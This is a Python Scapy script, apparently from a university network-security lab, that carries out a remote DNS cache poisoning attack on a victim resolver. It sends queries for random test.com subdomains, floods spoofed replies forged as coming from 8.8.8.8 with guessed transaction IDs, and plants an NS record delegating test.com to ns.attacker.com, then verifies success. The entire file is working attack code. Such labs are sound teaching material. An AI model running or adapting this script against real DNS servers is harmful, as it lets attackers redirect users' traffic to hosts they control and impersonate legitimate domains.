#! /usr/bin/env python3
# FIT3031/5037 Teaching Team (edited for Remote DNS task)

from scapy.all import *
import random

#### ATTACK CONFIGURATION ####
ATTEMPT_NUM = 10000
dummy_domain_lst = []

# IPs (update these to your actual lab IPs)
attacker_ip    = "10.10.10.2"   # Internal-Attacker
target_dns_ip  = "10.10.5.53"   # Victim DNS server
forwarder_dns  = "8.8.8.8"      # Upstream forwarder

# random subdomains under test.com
dummy_domain_prefix = "abcdefghijklmnopqrstuvwxy0987654321"
base_domain = ".test.com"

# Victim DNS's fixed query-source port (set in named.conf.options)
target_dns_port = 33333

# ---------- Step 1: build 10,000 random hostnames ----------
for _ in range(ATTEMPT_NUM):
    random_substr = ''.join(random.choices(dummy_domain_prefix, k=10))
    dummy_domain_lst.append(f"{random_substr}{base_domain}")
print(f"Completed generating {len(dummy_domain_lst)} dummy domains")

# ---------- Attack simulation ----------
for attempt in range(ATTEMPT_NUM):
    cur_domain = dummy_domain_lst[attempt]
    print("> url:", cur_domain)

    # ---------- Step 2: send a normal DNS query to victim DNS (port 53) ----------
    IPpkt  = IP(src=attacker_ip, dst=target_dns_ip)
    UDPpkt = UDP(sport=random.randint(1025, 65000), dport=53)
    DNSpkt = DNS(rd=1, qd=DNSQR(qname=cur_domain))
    query_pkt = IPpkt/UDPpkt/DNSpkt
    send(query_pkt, verbose=0)

    # ---------- Step 3: flood ~100 spoofed replies with random TXIDs ----------
    for j in range(100):
        tran_id = random.randint(0, 65535)

        # forged reply: 8.8.8.8 → victim DNS : sport=53, dport=33333
        IPspoof  = IP(src=forwarder_dns, dst=target_dns_ip)
        UDPspoof = UDP(sport=53, dport=target_dns_port)

        DNSspoof = DNS(
            id=tran_id, qr=1, aa=1, rd=0, ra=1,
            qd=DNSQR(qname=cur_domain),

            # answer for the random subdomain
            an=DNSRR(rrname=cur_domain, type="A", ttl=600, rdata=attacker_ip),

            # authority: poison NS for test.com
            ns=DNSRR(rrname="test.com", type="NS", ttl=90000, rdata="ns.attacker.com"),

            # additional (glue): A record for ns.attacker.com
            ar=DNSRR(rrname="ns.attacker.com", type="A", ttl=90000, rdata=attacker_ip)
        )

        resp_pkt = IPspoof/UDPspoof/DNSspoof
        send(resp_pkt, verbose=0)

    # ---------- Step 4: verify (ask victim DNS again) ----------
    verify = IP(dst=target_dns_ip)/UDP(sport=random.randint(1025,65000), dport=53)/DNS(rd=1, qd=DNSQR(qname=cur_domain))
    z = sr1(verify, timeout=2, retry=0, verbose=0)
    try:
        if z and z.haslayer(DNS) and z[DNS].an and z[DNS].an.rdata == attacker_ip:
            print("Poisoned the victim DNS server successfully on:", cur_domain)
            break
        else:
            print("Poisoning failed on this attempt")
    except Exception:
        print("Poisoning failed (no answer)")
